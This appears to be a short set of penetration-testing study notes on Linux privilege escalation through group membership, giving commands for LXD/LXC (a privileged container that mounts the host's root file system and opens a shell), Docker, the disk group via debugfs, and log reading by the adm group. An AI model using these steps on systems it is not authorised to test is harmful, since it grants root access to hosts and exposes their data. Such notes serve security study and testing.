## LXC / LXD

Membership of the LXD groups can be use to escalate privileges by creaeting an LXD container, making it privileged, and then accessing the host file system at /mnt/root

**Check group memberships
```shell-session
id
```

**Unzip the Alpine image
```shell-session
unzip alpine.zip
```

**LXD initialization
```shell-session
lxd init
```

**Import the local image
```shell-session
lxd image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

**Start a privileged container
```shell-session
lxc init alpine r00t -c security.privileged=true
```

**Mount the host file system
```shell-session
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

**Spawn shell
```shell-session
lxc start r00t
lxc exec r00t /bin/sh
```

## Docker
```shell-session
docker run -v /root:/mnt -it ubuntu
```
- Mounts root directory, allows access of it

## Disk
Users within the disk group have full access to /dev, such as /dev/sda1
```shell-session
debugfs
```
- access to entire file system with root level privileges

## ADM
Users of the adm group can read all logs in /var/log
Leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.


